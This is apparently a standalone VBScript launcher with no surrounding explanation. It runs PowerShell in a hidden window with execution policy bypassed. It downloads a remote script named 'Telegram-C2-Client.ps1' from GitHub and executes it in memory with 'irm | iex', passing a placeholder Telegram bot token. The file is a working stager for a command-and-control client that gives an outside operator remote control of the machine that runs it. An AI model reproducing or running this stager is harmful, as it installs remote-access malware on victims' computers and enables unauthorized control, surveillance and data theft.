Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='YOUR_TELEGRAM_BOT_API_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex", 0, True

